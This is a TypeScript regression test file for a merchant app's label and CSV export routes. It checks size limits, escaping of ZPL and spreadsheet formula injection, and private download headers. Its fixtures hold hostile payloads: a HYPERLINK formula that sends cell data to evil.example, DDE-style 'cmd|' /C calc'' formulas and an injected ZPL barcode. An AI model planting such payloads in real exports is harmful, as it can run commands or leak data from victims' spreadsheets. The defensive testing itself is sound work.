/**
 * Regression tests for the attack-test findings on merchant download routes:
 * - labels: unbounded counts exhausted server memory; barcodes injected ZPL
 * - analytics export: product titles injected spreadsheet formulas (#79)
 * - all downloads: private, non-cacheable, non-sniffable responses
 */
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { LoaderFunctionArgs } from "react-router";
import { MAX_LABELS_PER_REQUEST } from "../lib/warehouse-labels.server";

const { variantFindMany, getInventoryValuation, getDeadStock, fetchLocations } =
  vi.hoisted(() => ({
    variantFindMany: vi.fn(),
    getInventoryValuation: vi.fn(),
    getDeadStock: vi.fn(),
    fetchLocations: vi.fn(),
  }));

vi.mock("../tenant/require-admin-tenant.server", () => ({
  requireAdminTenant: vi.fn(async () => ({
    admin: { graphql: vi.fn() },
    tenant: { shopId: "shop-a", myshopifyDomain: "shop-a.myshopify.com" },
    db: { shopifyVariantCache: { findMany: variantFindMany } },
  })),
}));
vi.mock("./forecasting.server", () => ({ getInventoryValuation, getDeadStock }));
vi.mock("./shopify-gql.server", () => ({ fetchLocations }));

import { loader as labelsLoader } from "../routes/app.warehouse_.labels";
import { loader as exportLoader } from "../routes/app.analytics_.export";

const GID = "gid://shopify/ProductVariant/1002";

function args(path: string): LoaderFunctionArgs {
  return {
    request: new Request(`https://app.example${path}`),
    params: {},
    context: {},
  } as LoaderFunctionArgs;
}

function expectPrivateDownload(response: Response): void {
  expect(response.headers.get("Cache-Control")).toBe("private, no-store");
  expect(response.headers.get("X-Content-Type-Options")).toBe("nosniff");
  expect(response.headers.get("Content-Disposition")).toMatch(/^attachment; filename="[A-Za-z0-9._-]+"$/);
}

describe("warehouse labels route", () => {
  beforeEach(() => {
    variantFindMany.mockReset();
    variantFindMany.mockResolvedValue([
      {
        shopifyVariantId: GID,
        title: "Alpha Widget",
        barcode: "12^XZ^XA^FDINJECTED",
        sku: "SKU-A2",
      },
    ]);
  });

  it("refuses an oversized label count before touching the database", async () => {
    const response = (await labelsLoader(
      args(`/app/warehouse/labels?items=${encodeURIComponent(GID)}:40000000`),
    )) as Response;

    expect(response.status).toBe(400);
    expect(variantFindMany).not.toHaveBeenCalled();
  });

  it("prints labels for a link built the way the warehouse UI builds it", async () => {
    const response = (await labelsLoader(
      args(`/app/warehouse/labels?items=${encodeURIComponent(GID)}:2`),
    )) as Response;
    const zpl = await response.text();

    expect(response.status).toBe(200);
    expect(variantFindMany).toHaveBeenCalledTimes(1);
    expect(variantFindMany).toHaveBeenCalledWith({
      where: { shopifyVariantId: { in: [GID] } },
    });
    expect(zpl.match(/\^XA/g)).toHaveLength(2);
    expect(zpl.match(/\^XZ/g)).toHaveLength(2);
    expect(zpl).not.toContain("INJECTED");
    expectPrivateDownload(response);
  });

  it("prints exactly the maximum number of labels", async () => {
    variantFindMany.mockResolvedValue([
      { shopifyVariantId: GID, title: "Alpha Widget", barcode: "111", sku: null },
    ]);
    const response = (await labelsLoader(
      args(`/app/warehouse/labels?items=${encodeURIComponent(GID)}:${MAX_LABELS_PER_REQUEST}`),
    )) as Response;

    expect(response.status).toBe(200);
    expect((await response.text()).match(/\^XA/g)).toHaveLength(MAX_LABELS_PER_REQUEST);
  });
});

describe("analytics export route", () => {
  beforeEach(() => {
    fetchLocations.mockResolvedValue([
      { id: "gid://shopify/Location/1", name: "@SUM(1+1)*cmd|' /C calc'!A0" },
    ]);
    getInventoryValuation.mockResolvedValue({
      lines: [
        {
          title: '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
          locationId: "gid://shopify/Location/1",
          quantity: 4,
          unitCost: 2.5,
          value: 10,
        },
        {
          title: "Widget",
          locationId: "gid://shopify/Location/99",
          quantity: 1,
          unitCost: 3,
          value: 3,
        },
      ],
    });
    getDeadStock.mockResolvedValue([
      { title: "-2+3+cmd|' /C calc'!A0", quantity: -1, avgCost: 1, tiedUpCapital: -1 },
    ]);
  });

  it("neutralizes formulas in the valuation export and keeps numbers numeric", async () => {
    const response = (await exportLoader(
      args("/app/analytics/export?report=valuation"),
    )) as Response;
    const csv = await response.text();

    expect(csv).toBe(
      "Variant,Location,Quantity,Unit landed cost,Value\r\n" +
        `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")",'@SUM(1+1)*cmd|' /C calc'!A0,4,2.5000,10.00\r\n` +
        "Widget,gid://shopify/Location/99,1,3.0000,3.00\r\n",
    );
    expectPrivateDownload(response);
  });

  it("exports locations by name, keeping the GID only for unknown locations (#79)", async () => {
    fetchLocations.mockResolvedValue([
      { id: "gid://shopify/Location/1", name: "Main warehouse" },
    ]);
    const response = (await exportLoader(
      args("/app/analytics/export?report=valuation"),
    )) as Response;
    const [, first, second] = (await response.text()).split("\r\n");

    expect(first.endsWith(",Main warehouse,4,2.5000,10.00")).toBe(true);
    expect(second).toBe("Widget,gid://shopify/Location/99,1,3.0000,3.00");
  });

  it("neutralizes formulas in the dead-stock export", async () => {
    const response = (await exportLoader(
      args("/app/analytics/export?report=deadstock"),
    )) as Response;

    expect(await response.text()).toBe(
      "Variant,Quantity,Avg landed cost,Tied-up capital\r\n" +
        "'-2+3+cmd|' /C calc'!A0,-1,1.0000,-1.00\r\n",
    );
    expectPrivateDownload(response);
  });
});
